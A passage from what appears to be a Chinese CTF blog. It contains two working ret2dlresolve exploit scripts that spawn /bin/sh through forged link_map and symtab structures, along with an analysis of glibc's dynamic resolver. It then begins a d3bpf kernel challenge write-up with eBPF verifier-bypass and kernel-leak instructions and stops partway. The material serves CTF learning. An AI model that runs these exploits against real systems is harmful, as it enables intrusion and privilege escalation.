b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x600EC0 + 0x8, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)# 这里就是读取DT_DEBUG中的d_ptr的值，并写到0x601040的位置payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               3, 1, 0, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)bss = bss+0x10# 设置a1为8，读取r_debug中的d_val值(即为link_map)并存放在0x601040位置payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x601028, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               3, 1, 8, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 设置a1位-0x54680 + 8，获得link_map-&gt;l_next-&gt;l_next-&gt;l_info[3]的值(即为libc的got表地址)并存放在0x601040的位置payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x601028, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               3, 1, -0x54680 + 8, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 设置a1为0x10，获得_dl_runtime_resolve函数地址，并存放在0x601fd0位置payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x601028, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               501, 1, 0x10, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)bss = bss - 0x10# 这里又一次读取了一下DT_DEBUG + 8的内容payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x600EC0 + 0x8, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               3, 1, 0, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)bss = bss+0x10# 这里是向0x601020位置写入link_map地址payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x601028, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               0, 0, 8, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 这一步是修改link_map的dynrel指针指向bss段payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x601028, gadget_for_write, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               bss+0x300, 0x1f, -1, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 在bss段的对应位置写上fake_dynrelpayload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15,               bss+0x300, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0, bss+0x310).ljust(0x20,           b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;)sleep(0.5)# 在fake_dynrel结构体的偏移为0x8的位置只想的是fake_rel的地址，所以还需要在这里伪造payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15,               bss+0x310, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(bss+0x700, 7, 0))sleep(0.5)# 写入fake strtab和/bin/shpayload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15,               bss+0x30, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0, bss+0x40, b&quot;system\\x00&quot;).ljust(0x50,           b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;)sleep(0.5)# 覆盖link_map中strtab指针的地址payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               bss+0x30, 0xd, -1, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 写入fake_symtabpayload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15,               bss+0x100, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0, elf.got[&#x27;read&#x27;]-8).ljust(0x50, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;)sleep(0.5)# 覆盖link_map中的symtab指针的值payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               bss+0x100, 0xe, -1, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)bss = bss - 0x10# 读取link_map地址到0x601040位置payload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x600EC0 + 0x8, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               3, 1, 0, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)bss = bss+0x10# 写入link_map地址，实现栈为_dl_runtime_resolve(&lt;-rsp)=&gt;link_map=&gt;0 并且此时rip为retpayload = flat(b&#x27;a&#x27;*0x18, pop_rdi, 0, pop_rsi_r15, bss, 0, read_plt, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)r.sendline(flat(0x601028, gadget_for_read, 0x600EC0 + 0x8))sleep(0.5)payload = flat(b&#x27;a&#x27;*0x18, gadget_csu, 0, 1, bss + 8,               503, 0, 8, 0x4007C0, b&#x27;a&#x27;*0x8*7, main_addr)payload = payload.ljust(0x100, b&#x27;\\x00&#x27;)r.send(payload)sleep(0.5)# 通过栈迁移，顺利执行dl-runtime-resolvepayload = flat(b&#x27;a&#x27;*0x10, 0x601fc8, pop_rdi, bss+0x100+0x50, 0x400772)gdb.attach(r, &#x27;directory ./glibc-2.35/elf&#x27;)r.sendline(payload)r.interactive()\n\n重点：与Partial利用方式的区别Partial利用方式重谈( 在下面讨论老版本时，默认只存在栈溢出，不存在上述题目中的gadget )\n在以前的文章，在64位的partial保护中我写的非常粗糙，所以在这里也趁此机会详细谈一下。\nDL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL])\t\t      + reloc_offset (pltgot, reloc_arg));  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    &#123;      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;\t  const ElfW(Half) *vernum =\t    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      value = DL_FIXUP_MAKE_VALUE (result,\t\t\t\t   SYMBOL_ADDRESS (result, sym, false));    &#125;  else    &#123;      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));      result = l;    &#125;  ... ...&#125;\n\n首先则是关于_dl_fixup函数的重新分析，通过字符串进行查找对应函数时我们需要进入到底这条if语句\nif (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)\n\n而最终真正找到函数地址的函数其实是_dl_lookup_symbol_x函数。然而其中存在一条调用关系是do_lookup_x=&gt;check_match。\nstatic const ElfW(Sym) *check_match (const char *const undef_name,\t     const ElfW(Sym) *const ref,\t     const struct r_found_version *const version,\t     const int flags,\t     const int type_class,\t     const ElfW(Sym) *const sym,\t     const Elf_Symndx symidx,\t     const char *const strtab,\t     const struct link_map *const map,\t     const ElfW(Sym) **const versioned_sym,\t     int *const num_versions)&#123;  unsigned int stt = ELFW(ST_TYPE) (sym-&gt;st_info);  assert (ELF_RTYPE_CLASS_PLT == 1);  if (__glibc_unlikely ((sym-&gt;st_value == 0 /* No value.  */\t\t\t &amp;&amp; sym-&gt;st_shndx != SHN_ABS\t\t\t &amp;&amp; stt != STT_TLS)\t\t\t|| elf_machine_sym_no_match (sym)\t\t\t|| (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))    return NULL;  /* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,     STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no     code/data definitions.  */#define ALLOWED_STT \\  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \\   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))  if (__glibc_unlikely (((1 &lt;&lt; stt) &amp; ALLOWED_STT) == 0))    return NULL;  if (sym != ref &amp;&amp; strcmp (strtab + sym-&gt;st_name, undef_name))    /* Not the symbol we are looking for.  */    return NULL;  const ElfW(Half) *verstab = map-&gt;l_versyms;  if (version != NULL)    &#123;      if (__glibc_unlikely (verstab == NULL))\t&#123;\t  assert (version-&gt;filename == NULL\t\t  || ! _dl_name_match_p (version-&gt;filename, map));\t  /* Otherwise we accept the symbol.  */\t&#125;      else\t&#123;\t  /* We can match the version information or use the\t     default one if it is not hidden.  */\t  ElfW(Half) ndx = verstab[symidx] &amp; 0x7fff;\t  if ((map-&gt;l_versions[ndx].hash != version-&gt;hash\t       || strcmp (map-&gt;l_versions[ndx].name, version-&gt;name))\t      &amp;&amp; (version-&gt;hidden || map-&gt;l_versions[ndx].hash\t\t  || (verstab[symidx] &amp; 0x8000)))\t    /* It&#x27;s not the version we want.  */\t    return NULL;\t&#125;    &#125;  else    &#123;      if (verstab != NULL)\t&#123;\t  if ((verstab[symidx] &amp; 0x7fff)\t      &gt;= ((flags &amp; DL_LOOKUP_RETURN_NEWEST) ? 2 : 3))\t    &#123;\t      /* Don&#x27;t accept hidden symbols.  */\t      if ((verstab[symidx] &amp; 0x8000) == 0\t\t  &amp;&amp; (*num_versions)++ == 0)\t\t/* No version so far.  */\t\t*versioned_sym = sym;\t      return NULL;\t    &#125;\t&#125;    &#125;  /* There cannot be another entry for this symbol so stop here.  */  return sym;&#125;\n\n而在check_match函数中通过这条if (version != NULL)语句又分为了两条分支，肉眼可见的是上面的分支是较为严格的一条，而下面的则是较为简单的一条。不过显而易见的是这条分支的走向是由version变量决定的。\nif (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;\t  const ElfW(Half) *vernum =\t    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;\n\n而version的由来就是上面的这段代码赋予的，所以如果我们可以控制\nl-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL\n\n或者可以控制ndx都是可以解决的。\n首先思考第二种方式，首先则是可以看到这里ndx中的计算方式ELFW(R_SYM) (reloc-&gt;r_info)和前面获取sym时是同一种运算方式。所以这一算式中的各个参数我们是优先保证sym的正确性的。不过DT_SYMTAB所处的段和DT_VERSYM所处的段是不一样的，这也是我们能够修改这里的依据之一，另一个依据则是&amp;l-&gt;l_versions[0]的内容是NULL。所以我们只需要让他为NULL即可。\nDT_VERSYM节的位置其实就是.gnu.version节的位置，所以首先通过readelf查看一下节的位置\nVersion symbols section &#x27;.gnu.version&#x27; contains 7 entries:Addr: 0x00000000004003dc  Offset: 0x0003dc  Link: 5 (.dynsym)000:   0 (*local*)       0 (*local*)       2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)004:   3 (GLIBC_2.7)     2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)\n\n随后看一下程序在运行时的内存布局\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA        0x400000           0x401000 r-xp     1000 0      /ctf/work/download/todo/ezzzz        0x600000           0x601000 r--p     1000 0      /ctf/work/download/todo/ezzzz        0x601000           0x602000 rw-p     1000 1000   /ctf/work/download/todo/ezzzz\n\n可以看到DT_VERSYM所处的位置就是第一页中。\n而在linux存在这样一种分页机制，如果当前页的使用不到0x1000其实也会返回一页，所以在没有使用完的情况下，页内可能存在空白数据也就是\\x00。而这个段的结束位置则在.eh_frame可以看到地址为0000000000400860，那么当这个结束地址减去.gnu.version的地址则表示所取的ndx的偏移到0x400860 ~ 0x401000之间到最小值。\n在x64和x32上ElfW(Half)的结构都是2个字节。所以上述的最小偏移是：(0x400860-0x4003dc) / sizeof(ElfW(Half)) = 0x242\n而我们需要把伪造的内容放到bss段上，随后计算最大偏移则是根据sym的获取进行计算(0x602000-0x601000) /sizeof (Elf64_Sym) = 0xaa。最终得到0xaa &lt; 0x242所以也就导致无法在满足ndx的同时拿到伪造的sym结构。**(不过32位是可以的，只需要在bss靠后的位置写sym结构体即可)**。\n那么接着思考第一种方式，在只有栈溢出的情况下我们无法直接泄漏或修改link_map结构体中的内容，那么唯一可行的方法就是进行栈迁移在bss中伪造link_map，但是如果是走第一个分支就会出现一种情况了。\nlookup_t_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,\t\t     const ElfW(Sym) **ref,\t\t     struct r_scope_elem *symbol_scope[],\t\t     const struct r_found_version *version,\t\t     int type_class, int flags, struct link_map *skip_map)&#123;  const unsigned int new_hash = _dl_new_hash (undef_name);  unsigned long int old_hash = 0xffffffff;  struct sym_val current_value = &#123; NULL, NULL &#125;;  struct r_scope_elem **scope = symbol_scope;  bump_num_relocations ();  /* DL_LOOKUP_RETURN_NEWEST does not make sense for versioned     lookups.  */  assert (version == NULL || !(flags &amp; DL_LOOKUP_RETURN_NEWEST));  size_t i = 0;  if (__glibc_unlikely (skip_map != NULL))    /* Search the relevant loaded objects for a definition.  */    while ((*scope)-&gt;r_list[i] != skip_map)      ++i;  /* Search the relevant loaded objects for a definition.  */  for (size_t start = i; *scope != NULL; start = 0, ++scope)    if (do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,\t\t     &amp;current_value, *scope, start, version, flags,\t\t     skip_map, type_class, undef_map) != 0)      break;  ... ...&#125;\n\n在_dl_lookup_symbol_x函数中搜索的方法是根据scope这个范围搜索的，而这个范围是通过l-&gt;l_scope获取的，所以如果我们在没有任何地址泄漏的情况下要想伪造l_scope是不现实的。那么唯一的方法是什么呢？\n当然是走else语句了。\nvalue = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));\n\n这里直接返回的是link_map-&gt;l_addr + sym-&gt;d_val。\nfrom pwn import *r = process(&#x27;./ret2dlsolve_64&#x27;)elf = ELF(&#x27;./ret2dlsolve_64&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)pop_rdi = 0x00000000004005c3pop_rsi_r15 = 0x00000000004005c1read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x4003f6bss = elf.bss()l_addr = libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi)+p64(0) + \\    p64(pop_rsi_r15)+p64(bss+0x100)+p64(0) + \\    p64(read_plt)+p64(elf.symbols[&#x27;fun&#x27;])r.sendline(payload)dynstr_addr = 0x400318 # str tablefake_link_map_addr = bss+0x100r_offset = fake_link_map_addr + l_addr * -1 - 8l_addr = l_addr &amp; (2**64-1)fake_strtab = p64(0)+p64(dynstr_addr)fake_strtab_addr = fake_link_map_addr+0x8fake_symtab = p64(0)+p64(read_got-0x8)fake_symtab_addr = fake_link_map_addr+0x18fake_dynrel_addr = fake_link_map_addr+0x28fake_rel_addr = fake_link_map_addr+0x38fake_dynrel = p64(0)+p64(fake_rel_addr)fake_rel = p64(r_offset)+p64(0x7)+p64(0)fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_relfake_link_map = fake_link_map.ljust(0x68, b&#x27;\\x00&#x27;)fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)fake_link_map = fake_link_map.ljust(0xf8,b&#x27;\\x00&#x27;)+p64(fake_dynrel_addr)fake_link_map = fake_link_map.ljust(0x100,b&#x27;\\x00&#x27;)+b&#x27;/bin/sh&#x27;r.sendline(fake_link_map)bin_sh_addr = fake_link_map_addr+0x100payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(read_load_plt) + \\    p64(fake_link_map_addr)+p64(0)r.sendline(payload)r.interactive()\n\n这里再次审视这段exp，可以发现l_addr其实就是read函数和system函数之间的差值，而sym-&gt;d_val就是read函数的地址，并且可以将这篇文章的代码进行编译会发现他的got表中read函数不是首位，第一个函数是_libc_start_main这也刚好可以让sym-&gt;st_other不为0从而进入else。\n与Full的差别可以很明显的看出来，这道题目所利用的方式其实是走的if分支而不是else，因为这道题压根没给libc所以无法计算偏移。虽然我在构造sym结构体的时候选择了read@got - 8的位置，但是属于是瞎猫碰到死耗子这个题目中的read就是got表中的第一个函数，所以才没有导致sym-&gt;st_other为非0。\n可能大家会疑惑为什么这里能够走上面的if语句，又是因为运气好（可能是做题运气用完了，国赛啥都没抽到😭），在进行时ndx又是为0。当然如果不为0我们可以采取上面的第二种办法，直接覆盖0x1d0为0即可。\n\n\n参考链接：\n​    https://inaz2.hatenablog.com/entry/2014/07/29/020112\n​    https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41\n","categories":["pwn"],"tags":["dl-runtime-resolve","Full RELRO"]},{"title":"d3bpf","url":"/2023/01/06/d3bpf/","content":"虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。\n题目分析diff --git a/fs/fs_context.c b/fs/fs_context.cindex 2834d1afa..0a79c9099 100644--- a/fs/fs_context.c+++ b/fs/fs_context.c@@ -530,7 +530,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param) \t\t\t      param-&gt;key); \t&#125; -\tif (len &gt; PAGE_SIZE - 2 - size)+\tif (size + len + 2 &gt; PAGE_SIZE) // patch for CVE-2022-0185 \t\treturn invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;); \tif (strchr(param-&gt;key, &#x27;,&#x27;) || \t    (param-&gt;type == fs_value_is_string &amp;&amp;diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.cindex 37581919e..8e98d4af5 100644--- a/kernel/bpf/verifier.c+++ b/kernel/bpf/verifier.c@@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, \t\t\tscalar_min_max_lsh(dst_reg, &amp;src_reg); \t\tbreak; \tcase BPF_RSH:-\t\tif (umax_val &gt;= insn_bitness) &#123;-\t\t\t/* Shifts greater than 31 or 63 are undefined.-\t\t\t * This includes shifts by a negative number.-\t\t\t */-\t\t\tmark_reg_unknown(env, regs, insn-&gt;dst_reg);+\t\tif (umin_val &gt;= insn_bitness) &#123;+\t\t\tif (alu32)+\t\t\t\t__mark_reg32_known(dst_reg, 0);+\t\t\telse+\t\t\t\t__mark_reg_known_zero(dst_reg); \t\t\tbreak; \t\t&#125; \t\tif (alu32)diff --git a/net/packet/af_packet.c b/net/packet/af_packet.cindex 6bbc7a448..d949fdf00 100644--- a/net/packet/af_packet.c+++ b/net/packet/af_packet.c@@ -4448,9 +4448,10 @@ static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u, \t&#125;  out_free_pg_vec:-\tbitmap_free(rx_owner_map);-\tif (pg_vec)+\tif (pg_vec) &#123;+\t\tbitmap_free(rx_owner_map); // patch for CVE-2021-22600 \t\tfree_pg_vec(pg_vec, order, req-&gt;tp_block_nr);+\t&#125; out: \treturn err; &#125;\n\n题目拿到手之后是一个diff文件，在文件最上面有一个patch是为了修复CVE-2022-0185，在文件的最下面是一个patch，也明说了就是为了修复CVE-2021-22600，不过上面还有一段修改。\n上面将原本的语句删除了，并且添加了几条语句。原本的语句中的，在进行RSH时，如果超过31或则63则将寄存器设置为unkown。但是在修改过后的语句中如果超过了63或者31不是设置为unknown而是默认设置为0。\n这里因为架构的原因，如果我们使用右移64位得到的结果为1\npwndbg&gt; p/x 1 &gt;&gt; 64$3 = 0x1pwndbg&gt;\n\n所以题目这里给的漏洞为，在verifier为0但是在runtime为1的寄存器。\n观察题目的启动命令\nqemu-system-x86_64 \\  -m 128M \\  -kernel bzImage \\  -initrd rootfs.cpio \\  -append &#x27;console=ttyS0 kaslr quiet&#x27; \\  -monitor /dev/null \\  -cpu kvm64,+smep,+smap \\  -smp cores=1,threads=1 \\  -nographic \\  -s\n\n基本上能开的都开了，启动虚拟机也可以查看，其实kpti也是打开了的。\n利用分析泄漏因为我们现在有一个verifier为0，runtime为1的寄存器所以我们可以尝试越界读来造成泄漏，首先就需要认识bpf_map结构体:\nstruct bpf_map &#123;\t/* The first two cachelines with read-mostly members of which some\t * are also accessed in fast-path (e.g. ops, max_entries).\t */\tconst struct bpf_map_ops *ops ____cacheline_aligned;\tstruct bpf_map *inner_map_meta;#ifdef CONFIG_SECURITY\tvoid *security;#endif\tenum bpf_map_type map_type;\tu32 key_size;\tu32 value_size;\tu32 max_entries;\tu32 map_flags;\tint spin_lock_off; /* &gt;=0 valid offset, &lt;0 error */\tu32 id;\tint numa_node;\tu32 btf_key_type_id;\tu32 btf_value_type_id;\tstruct btf *btf;#ifdef CONFIG_MEMCG_KMEM\tstruct mem_cgroup *memcg;#endif\tchar name[BPF_OBJ_NAME_LEN];\tu32 btf_vmlinux_value_type_id;\tbool bypass_spec_v1;\tbool frozen; /* write-once; write-protected by freeze_mutex */\t/* 22 bytes hole */\t/* The 3rd and 4th cacheline with misc members to avoid false sharing\t * particularly with refcounting.\t */\tatomic64_t refcnt ____cacheline_aligned;\tatomic64_t usercnt;\tstruct work_struct work;\tstruct mutex freeze_mutex;\tu64 writecnt; /* writable mmap cnt; protected by freeze_mutex */&#125;;\n\n如果我们在开始定义类型为BPF_MAP_TYPE_ARRAY那么结构体如下:\nstruct bpf_array &#123;\tstruct bpf_map map;\tu32 elem_size;\tu32 index_mask;\tstruct bpf_array_aux *aux;\tunion &#123;\t\tchar value[0] __aligned(8);\t\tvoid *ptrs[0] __aligned(8);\t\tvoid __percpu *pptrs[0] __aligned(8);\t&#125;;&#125;;\n\n可以看到在上面的bpf_map结构体的开始位置有一个ops指针，而根据以往的经验ops中包含了很多内核函数的指针，当然事实也正如此\nconst struct bpf_map_ops array_map_ops = &#123;\t.map_meta_equal = array_map_meta_equal,\t.map_alloc_check = array_map_alloc_check,\t.map_alloc = array_map_alloc,\t.map_free = array_map_free,\t.map_get_next_key = array_map_get_next_key,\t.map_lookup_elem = array_map_lookup_elem,\t.map_update_elem = array_map_update_elem,\t.map_delete_elem = array_map_delete_elem,\t.map_gen_lookup = array_map_gen_lookup,\t.map_direct_value_addr = array_map_direct_value_addr,\t.map_direct_value_meta = array_map_direct_value_meta,\t.map_mmap = array_map_mmap,\t.map_seq_show_elem = array_map_seq_show_elem,\t.map_check_btf = array_map_check_btf,\t.map_lookup_batch = generic_map_lookup_batch,\t.map_update_batch = generic_map_update_batch,\t.map_btf_name = &quot;bpf_array&quot;,\t.map_btf_id = &amp;array_map_btf_id,\t.iter_seq_info = &amp;iter_seq_info,&#125;;\n\n因为我们上面所选择的类型为数组，所以这里ops会包含array_map_ops指针，所以我们可以利用它来泄漏内核地址。\n如果我们使用BPF_FUNC_map_lookup_elem来进行函数调用的话，根据上述ops我们最终会调用到array_map_lookup_elem函数\n/* Called from syscall or from eBPF program */static void *array_map_lookup_elem(struct bpf_map *map, void *key)&#123;\tstruct bpf_array *array = container_of(map, struct bpf_array, map);\tu32 index = *(u32 *)key;\tif (unlikely(index &gt;= array-&gt;map.max_entries))\t\treturn NULL;\treturn array-&gt;value + array-&gt;elem_size * (index &amp; array-&gt;index_mask);&#125;\n\n这里的注释也说明了，这里允许被syscall以及eBPF程序调用。而这里程序的返回内容则是map_ptr.value所以可以根据这里的偏移得出返回内容为map_ptr+0x110的地址。\n可能到这里大家都应该有一定的思路了，不过这里还存在一个检测ALU Sanitation，在这个检测中alu_limit表示操作允许最大值，这里做限制的主要目的是防止通过ebpf程序调用出现越界或访问不属于他自己的地址区域时所做的限制，如果我们src_reg的值大于alu_limit或者与之符号相反，那么src_reg会被强制制为0，导致指针运算失败。不过在这里绕过的方式也比较简单。\nBPF_MOV64_REG(BPF_REG_0, EXP_REG),BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),\n\n因为这里存在一个verifier为0的寄存器EXP_REG那么我们如果进行上述代码中的操作即可是的alm_limit为0x1000\n那么在做完上文中所有操作之后可以正式进入泄漏阶段了，其实有了上述思路，这里泄漏起来就比较简单了\nBPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110),BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 